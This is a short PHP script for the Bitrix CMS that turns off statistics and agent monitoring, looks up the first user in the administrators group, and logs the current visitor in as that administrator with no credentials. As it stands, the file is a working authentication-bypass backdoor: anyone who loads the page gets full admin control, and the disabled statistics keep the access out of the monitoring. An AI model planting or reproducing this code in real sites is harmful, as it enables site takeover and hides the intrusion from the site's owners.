<?
define('NO_KEEP_STATISTIC', true);
define('STOP_STATISTICS', true);
define('NO_AGENT_CHECK', true);
define('NO_AGENT_STATISTIC', true);
define('PERFMON_STOP', true);
define("DisableEventsCheck", true);
require_once($_SERVER["DOCUMENT_ROOT"] . "/bitrix/modules/main/include/prolog_before.php");

global $USER;
$filter = Array("GROUPS_ID" => Array(1));
$rsUsers = CUser::GetList(($by = "NAME"), ($order = "desc"), $filter);
while ($arUser = $rsUsers->Fetch()) {
    $USER->Authorize( $arUser['ID']);
    break;
}
require_once($_SERVER["DOCUMENT_ROOT"] . "/bitrix/modules/main/include/epilog_after.php");